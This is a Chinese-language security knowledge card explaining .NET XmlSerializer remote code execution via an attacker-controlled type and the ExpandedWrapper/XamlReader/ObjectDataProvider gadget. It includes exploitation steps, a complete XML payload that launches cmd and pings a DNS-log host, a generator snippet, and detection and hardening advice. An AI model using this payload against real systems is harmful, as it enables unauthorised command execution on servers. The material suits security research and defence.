---
id: web-dotnet-deser-xmlserializer-type-expandedwrapper-xamlreader-odp
title: XmlSerializer type 参数可控时选 ExpandedWrapper<XamlReader,ObjectDataProvider> 作反序列化根类型：XamlReader.Parse 解析 ResourceDictionary 启动进程
type: scenario
domain: web
path: web/dotnet/deserialization
technique: xmlserializer-type-controlled-expandedwrapper-xamlreader-odp
aliases:
- XmlSerializer type 可控
- new XmlSerializer(type) RCE
- ExpandedWrapper XamlReader
- ExpandedWrapperOfXamlReaderObjectDataProvider
- ResourceDictionary ObjectDataProvider
- Type.GetType 反序列化类型可控
- XmlSerializer 代码审计
tags:
- dotnet
- xmlserializer
- deserialization
- expandedwrapper
- xamlreader
- objectdataprovider
- wpf
- rce
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:13:20+08:00'
  notes: 已对照原文与 img01 逐字核对根类型/ExpandedWrapper/XamlReader.Parse/ResourceDictionary 完整 payload 及与 Telerik 卡的入口差异；未在目标环境实际执行（未验证点：目标需可加载 System.Data.Services 与 PresentationFramework）。
---

## 一句话结论

当应用把外部可控的字符串交给 `Type.GetType()`（或等价方式）再 `new XmlSerializer(type)` 时，攻击者可以把反序列化根类型直接指定为 `System.Data.Services.Internal.ExpandedWrapper<XamlReader, ObjectDataProvider>`：XmlSerializer 填充 `ProjectedProperty0` 的 `MethodName=Parse` 与 `MethodParameters` 后，ExpandedWrapper 把这次"属性赋值"变成对 `XamlReader` 实例的方法调用，`XamlReader.Parse` 解析内嵌的 `ResourceDictionary`，其中的 `ObjectDataProvider` 以 `Process.Start` 执行任意命令。

## 原理

- **XmlSerializer 的类型模型**：`new XmlSerializer(type)` 按给定类型建立映射，反序列化时实例化该类型并按 XML 设置其 public 属性与 public 字段。获取 type 的常见写法有 `typeof(Person)`、`obj.GetType()`、`Type.GetType("XmlDeserialization.Person")`；前两者类型固定，第三种若其字符串来自请求参数，类型选择权就落到了攻击者手里。
- **为什么可控 type 等于 RCE**：XmlSerializer 会按根元素的 `type` 属性/给定类型解析出任意可加载的 .NET 类型并构造对象图，属性赋值会真实调用 setter 及相关逻辑。攻击者不再受业务类型约束，可以挑选专门的"带行为"的类型作为反序列化根。
- **ExpandedWrapper 的投影语义**：`System.Data.Services.Internal.ExpandedWrapper<T1,T2>`（System.Data.Services.dll，.NET Framework 自带）用于把两个对象的属性"投影"成一个复合对象。它持有 `ObjectInstance` 与 `ProjectedProperty0/1`；当属性被赋值后，它会对 `ObjectInstance`（T1 类型）调用 `ProjectedProperty0`（ObjectDataProvider）设定的 `MethodName`，参数取自 `MethodParameters`。取 T1=`System.Windows.Markup.XamlReader`、T2=`System.Windows.Data.ObjectDataProvider` 时，反序列化过程就变成 `XamlReader.Parse(攻击者字符串)`。
- **ResourceDictionary 承接 ObjectDataProvider**：`XamlReader.Parse` 解析 `ResourceDictionary` 时会实例化其中的 `ObjectDataProvider`；`ObjectType="{d:Type c:Process}"`、`MethodName="Start"`、`MethodParameters` 为 `cmd` 与 `/c <命令>`，即完成 `Process.Start("cmd", "/c <命令>")`。文章给出的完整 payload 根类型与两段嵌套关系见 PoC，实测命令用 `ping <dnslog 子域>` 外带验证。
- **审计视角**：该场景的前提是"type 可控"（初始化参数可控）；第二类问题是 `xml.Deserialize(stream)` 的输入是否可控——类型固定时 XmlSerializer 通常只映射该类型，但若目标对象含 `object`/`xsi:type` 多态字段或危险 setter，仍可能被二次利用，需要逐类型检查。文章也给出"自定义恶意类 + ExpandedWrapper"的验证方法：把自己的类作为 T1，`ProjectedProperty0.MethodName` 指向类中的恶意方法即可执行命令。

## 触发条件

- 应用代码存在 `new XmlSerializer(type)`，且 `type` 可由外部输入影响（典型如 `Type.GetType(request["type"])`）。
- `xml.Deserialize(...)` 的 XML 内容可控。
- 目标进程可加载 `System.Data.Services`（.NET Framework 自带）、`PresentationFramework`/`System.Xaml`（WPF）等程序集。
- 反序列化端没有对根类型做白名单限制。

## 利用步骤

1. 在源码/黑盒中定位 `new XmlSerializer(...)` 调用，确认 type 参数来源；若为 `Type.GetType(用户输入)`、反射配置等即可控。
2. 构造根 type 为 `ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089` 的 XML。
3. 在 `ProjectedProperty0` 中写入 `MethodName=Parse`、`MethodParameters` 为包含 `ResourceDictionary`/`ObjectDataProvider` 的 XAML 字符串（`xsi:type="xsd:string"` + CDATA），`ObjectInstance` 用 `xsi:type="XamlReader"`。
4. 把 XML 提交给反序列化入口；命令在应用进程身份下执行，可用 DNSLog/回显确认。

## PoC

```xml
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
  <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <ExpandedElement/>
    <ProjectedProperty0>
      <MethodName>Parse</MethodName>
      <MethodParameters>
        <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
          <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c ping 8006a28a.dnslog.click</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
        </anyType>
      </MethodParameters>
      <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
    </ProjectedProperty0>
  </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

```csharp
// 文章给出的生成端思路：ExpandedWrapper 包装自定义类验证任意方法调用
ExpandedWrapper<Person, ObjectDataProvider> ew = new ExpandedWrapper<Person, ObjectDataProvider>();
ew.ProjectedProperty0 = new ObjectDataProvider();
ew.ProjectedProperty0.MethodName = "Evil";
ew.ProjectedProperty0.MethodParameters.Add("calc");
ew.ProjectedProperty0.ObjectInstance = new Person();
// 生产环境改用 ExpandedWrapper<XamlReader, ObjectDataProvider> + ResourceDictionary（见上 XML）
```

## 变体与关联

- 变体：把 T1 换成自定义类，`ProjectedProperty0.MethodName` 指向该类中可执行命令的方法，用于验证"属性赋值即方法调用"。
- 变体：同一套 ExpandedWrapper/XamlReader/ObjectDataProvider gadget 在不同入口复用：Telerik Reporting 的报表 XML 类型可控（见关联卡）、XamlImageInfo 的 Stream 构造器、ObjectDataProvider 关闭 ActivitySurrogateSelector 类型检查等。
- 关联：[[web-dotnet-deser-telerik-reporting-xmlserializer-type-expandedwrapper-xamlreader]]（同 gadget、产品化入口）、[[web-dotnet-deser-xamlimageinfo-lazyfilestream-xamlreader-rce]]（另一 XamlReader 载体）、[[web-dotnet-deser-ajaxpro-cve-2021-23758-objectdataprovider]]（ObjectDataProvider 经 JSON 入口）、[[web-dotnet-deser-textformattingrunproperties-xamlreader-odp-gadget]]（另一条到达 XamlReader 的经典路径）。
- 边界：type 不可控、仅数据可控时，需要逐类型检查多态字段/危险属性，不能直接套用本卡。

## 检测与防御

- 检测：请求/序列化数据中出现 `ExpandedWrapper`、`ExpandedWrapperOfXamlReaderObjectDataProvider`、`XamlReader`、`ObjectDataProvider`、`ResourceDictionary` 等类型名；`w3wp.exe` 等应用进程派生 `cmd.exe`/`powershell.exe`。
- 修复：绝不把用户输入交给 `Type.GetType`/`new XmlSerializer(type)`；反序列化根类型使用编译期固定类型与白名单。
- 加固：升级 .NET Framework 并启用最新安全补丁；业务不需要 WPF/XAML 的服务端进程限制相关程序集加载；WAF 拦截序列化流中的 `ExpandedWrapper`/`XamlReader` 特征。
